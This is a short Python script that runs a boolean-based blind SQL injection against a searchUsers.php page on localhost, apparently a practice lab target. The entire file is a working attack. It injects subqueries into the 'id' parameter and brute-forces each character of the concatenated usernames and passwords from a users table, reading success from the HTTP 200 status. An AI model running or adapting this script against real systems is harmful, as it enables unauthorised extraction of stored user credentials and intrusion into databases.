#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting... \n")
    sys.exit(1)

# Ctrl + C handler
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Brute Force")
    p1.status("Starting brute force process")

    time.sleep(2)

    p2 = log.progress("Extracted Data")

    extracted_info = ""

    for position in range(1, 150):
        for character in range(33, 126):
            sqli_url = main_url + "?id=1000000 or (select(select ascii(substring((select group_concat(username,0x3a, password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)

            p1.status(sqli_url)
            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':
    makeSQLI()
